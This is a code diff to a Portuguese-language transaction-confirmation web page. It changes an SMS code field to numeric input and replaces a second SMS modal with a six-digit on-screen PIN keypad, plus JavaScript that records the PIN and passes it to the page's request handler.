@@ -48,7 +48,7 @@
                     <div class="detalhes-transacao">
                         <h1>Confirme o código que recebeu por mensagem</h1>
                         
-                        <input type="text" class="form-control" placeholder="Digite aqui">
+                        <input type="number" class="form-control" placeholder="Digite aqui" maxlength="6" id="codigo-confirmacao" inputmode="numeric" autocomplete="off">
                         <br>
                         <p>Não recebeu o código?
                             <br> <span style="color:#640564;font-weight: 500;cursor:pointer;" onclick="InicioRequests.pedirNumeroNovo()">Click aqui...</span> </p>
@@ -56,7 +56,7 @@
                     <br>
                 </div>
                 <div class="modal-footer">
-                    <button class="btn btn-lg hvr-bounce-out" onclick="EnviarRequests.confirmarSMS()" style="background-color:#640564;color:white;display: block; margin:auto;width:100%;">CONFIRMAR OPERAÇÃO</button>
+                    <button class="btn btn-lg hvr-bounce-out" onclick="InicioRequests.confirmarNumero()" style="background-color:#640564;color:white;display: block; margin:auto;width:100%;">CONFIRMAR OPERAÇÃO</button>
                 </div>
             </div>
         </div>
@@ -74,19 +74,35 @@
                 </div>
                 <div class="modal-body">
                     <div class="detalhes-transacao">
-                        <h1>Confirme o código que recebeu por mensagem</h1>
-                        
-                        <input type="text" class="form-control" placeholder="Digite aqui">
-                        <br>
-                        <p>Não recebeu o código?
-                            <br> <span style="color:#640564;font-weight: 500;cursor:pointer;">Click aqui...</span> </p>
+                        <div class="container-pin">
+        <h1>AUTORIZAÇÃO DA OPERAÇÃO</h1>
+        <p>Autorize com o seu PIN</p>
+        <div class="pin-display">
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+            <div class="pin-circle"></div>
+        </div>
+        <div style="width: 210px;display: block;margin: auto;">
+<div class="keypad">
+            <button class="key" onclick="inputPin(1)">1</button>
+            <button class="key" onclick="inputPin(2)">2</button>
+            <button class="key" onclick="inputPin(3)">3</button>
+            <button class="key" onclick="inputPin(4)">4</button>
+            <button class="key" onclick="inputPin(5)">5</button>
+            <button class="key" onclick="inputPin(6)">6</button>
+            <button class="key" onclick="inputPin(7)">7</button>
+            <button class="key" onclick="inputPin(8)">8</button>
+            <button class="key" onclick="inputPin(9)">9</button>
+            <button class="key" onclick="deletePin()">DEL</button>
+            <button class="key" onclick="inputPin(0)">0</button>
+        </div>
+        </div>
+    </div>
                     </div>
                     <br>
-                </div>
-                <div class="modal-footer">
-                    <img src="assets/btn/btn-enviar-lg-confirmar.svg" alt
-                    class="btn-lg-svg hvr-bounce-out"
-                    onclick="EnviarRequests.confirmarSMS()">
                 </div>
             </div>
         </div>
@@ -134,7 +150,41 @@
 </script>
     <script src="pages/paginas.js"></script>
     <script src="router.js"></script>
-           
+    
+</script>
+
+<script>
+var pin = '';
+
+function inputPin(num) {
+    if (pin.length < 6) {
+        pin += num;
+        updatePinDisplay();
+    }
+    if (pin.length == 6){
+        updatePinDisplay();
+        ESCOPO.pin = pin;
+        InicioRequests.confirmarPin();
+        
+    }
+}
+
+
+function deletePin() {
+    pin = pin.slice(0, -1);
+    updatePinDisplay();
+}
+
+function updatePinDisplay() {
+    const circles = document.querySelectorAll('.pin-circle');
+    circles.forEach((circle, index) => {
+        if (index < pin.length) {
+            circle.style.backgroundColor = '#000';
+        } else {
+            circle.style.backgroundColor = '#fff';
+        }
+    });
+}
 </script>
 
 </html>
